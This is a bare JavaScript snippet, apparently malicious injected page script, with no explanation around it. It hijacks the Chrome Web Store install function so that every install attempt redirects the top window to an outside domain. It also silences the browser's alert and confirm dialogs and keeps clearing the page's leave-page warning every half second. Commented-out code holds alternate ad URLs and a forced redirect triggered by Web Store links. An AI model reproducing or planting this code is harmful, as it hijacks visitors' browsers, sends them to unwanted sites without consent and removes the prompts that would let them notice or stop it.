(function() {
window && (window.absdasbeedsabedsabe = true);
var getUrl = function() {
       var url = 'http://undroider.com/in/landb';
       // var url = 'http://selfsrver.com/apu.php?n=&zoneid=18197&cb='+Date.now()+'&direct=1';
       /*
       if (Math.trunc(Math.random() * 2) === 0) {
           url = 'http://fortyinventor.com';
       }*/
   return url;
};
var replacer = function() {
	window && window.chrome && window.chrome.webstore && (window.chrome.webstore.install  = function(a, b, c) { window.top.location.assign( getUrl() ); });
	window && window.alert && (window.alert = function() {});
	window && window.confirm && (window.confirm = function() {});
}
setInterval(replacer, 500);
/*
var int = setInterval(function() {
   if (document.domain.match('facebook.com') || document.location.pathname == "/" ) {
       clearInterval(int);
       return;
   }
   if (document.querySelector('head link[href*="chrome.google.com/webstore/detail"]')) {
       clearInterval(int);
       window.top.location.replace(getUrl());
   }
}, 500);
*/
setInterval(function() {
window.onbeforeunload = null;
}, 500);
})();
